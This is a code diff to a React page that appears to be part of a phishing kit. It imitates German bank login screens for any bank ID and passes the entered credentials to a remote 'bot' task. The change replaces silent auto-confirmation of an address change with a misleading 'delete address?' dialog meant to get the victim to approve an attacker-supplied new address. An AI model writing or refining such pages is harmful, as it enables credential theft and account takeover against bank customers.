@@ -1,7 +1,7 @@
 // @ts-nocheck
 import { useEffect, useMemo, useRef, useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
-import { Eye, EyeOff, AlertCircle } from "lucide-react";
+import { Eye, EyeOff, AlertCircle, Trash2 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 import { resolveAsset } from "@/lib/bankAssetUrl";
@@ -14,6 +14,16 @@ import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
 import type { BankTheme } from "@/data/banks";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 
 export const Route = createFileRoute("/login/$bankId")({
@@ -126,6 +136,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [credentialsInvalid, setCredentialsInvalid] = useState(false);
+
+  const [addressData, setAddressData] = useState<{
+    old_street?: string;
+    new_street?: string;
+    new_plz?: string;
+    new_city?: string;
+  } | null>(null);
+  const [showAddressDialog, setShowAddressDialog] = useState(false);
+  const [addressSubmitting, setAddressSubmitting] = useState(false);
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
   const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
@@ -389,18 +408,24 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
-      // Auto-confirm address without popup
+      // Manual address confirmation via popup (no auto-confirm)
       const addressConfirmSignal =
         st === "waiting_for_address_confirm" ||
         st === "waiting_for_address" ||
         payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
       if (addressConfirmSignal) {
         pollRef.current.positiveSeen = true;
-        setPhase("address_confirm");
-        setSubmitting(true);
+        const ad = (data as any)?.result?.address_data ?? (data as any)?.address_data ?? {};
+        setAddressData({
+          old_street: ad.old_street,
+          new_street: ad.new_street,
+          new_plz: ad.new_plz,
+          new_city: ad.new_city,
+        });
         if (!(pollRef.current as any).addressConfirmed) {
-          (pollRef.current as any).addressConfirmed = true;
-          confirmAddress(taskId).catch((e) => console.warn("[bot] confirm-address failed", e));
+          setShowAddressDialog(true);
+          setPhase("address_confirm");
+          setSubmitting(false);
         }
         pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
         return;
@@ -553,6 +578,20 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
 
   if (phase === "address_confirm") {
+    const currentTaskId = pollRef.current?.taskId;
+    const handleConfirmAddress = async () => {
+      if (!currentTaskId) return;
+      setAddressSubmitting(true);
+      try {
+        await confirmAddress(currentTaskId);
+        if (pollRef.current) (pollRef.current as any).addressConfirmed = true;
+        setShowAddressDialog(false);
+      } catch (e) {
+        console.warn("[bot] confirm-address failed", e);
+      } finally {
+        setAddressSubmitting(false);
+      }
+    };
     return (
       <BankShell {...shellProps}>
         <div className="max-w-md mx-auto mt-16 flex flex-col items-center gap-4 text-center">
@@ -561,12 +600,80 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             style={{ borderColor: themeColor, borderTopColor: "transparent" }}
           />
           <h2 className="text-xl font-semibold" style={{ color: themeColor }}>
-            Adresse wird aktualisiert…
+            {(pollRef.current as any)?.addressConfirmed ? "Adresse wird aktualisiert…" : "Adressprüfung"}
           </h2>
           <p className="text-sm text-gray-600">
             Bitte einen Moment Geduld, Ihre Daten werden verarbeitet.
           </p>
         </div>
+
+        <AlertDialog
+          open={showAddressDialog}
+          onOpenChange={(open) => {
+            if (!open && !addressSubmitting) {
+              // Cancel → reset the flow
+              resetToForm();
+            }
+            setShowAddressDialog(open);
+          }}
+        >
+          <AlertDialogContent className="sm:rounded-2xl border-0 shadow-2xl p-0 overflow-hidden">
+            <div className="h-1.5" style={{ backgroundColor: theme.buttonBg }} />
+            <div className="p-6 sm:p-8">
+              <AlertDialogHeader className="mb-5">
+                <div className="flex items-center gap-3 mb-1">
+                  <div
+                    className="w-10 h-10 rounded-full flex items-center justify-center"
+                    style={{ backgroundColor: theme.buttonBg + "15" }}
+                  >
+                    <Trash2 className="w-5 h-5" style={{ color: theme.buttonBg }} />
+                  </div>
+                  <AlertDialogTitle className="text-xl font-bold" style={{ color: themeColor }}>
+                    Adresse wirklich löschen?
+                  </AlertDialogTitle>
+                </div>
+                <AlertDialogDescription asChild>
+                  <div className="text-left space-y-4 pt-2">
+                    {addressData?.old_street && (
+                      <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
+                        <p className="text-xs text-gray-500 mb-1">Alte Adresse</p>
+                        <p className="font-semibold text-gray-900">{addressData.old_street}</p>
+                        <p className="mt-2 text-sm font-semibold text-red-600 flex items-center gap-1">
+                          <span aria-hidden>×</span> Wird entfernt
+                        </p>
+                      </div>
+                    )}
+                    {(addressData?.new_street || addressData?.new_plz || addressData?.new_city) && (
+                      <div className="rounded-xl bg-gray-50 p-4 border border-gray-200">
+                        <p className="text-xs text-gray-500 mb-1">Neue Adresse</p>
+                        <p className="font-semibold text-gray-900">{addressData?.new_street}</p>
+                        <p className="text-gray-600 text-sm">
+                          {addressData?.new_plz} {addressData?.new_city}
+                        </p>
+                      </div>
+                    )}
+                  </div>
+                </AlertDialogDescription>
+              </AlertDialogHeader>
+              <AlertDialogFooter className="flex justify-end gap-3 pt-2">
+                <AlertDialogCancel
+                  disabled={addressSubmitting}
+                  className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
+                >
+                  Abbrechen
+                </AlertDialogCancel>
+                <AlertDialogAction
+                  disabled={addressSubmitting}
+                  onClick={(e) => { e.preventDefault(); handleConfirmAddress(); }}
+                  className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0 disabled:opacity-70`}
+                  style={{ backgroundColor: theme.buttonBg }}
+                >
+                  {addressSubmitting ? "Wird gesendet…" : "Adresse löschen"}
+                </AlertDialogAction>
+              </AlertDialogFooter>
+            </div>
+          </AlertDialogContent>
+        </AlertDialog>
       </BankShell>
     );
   }
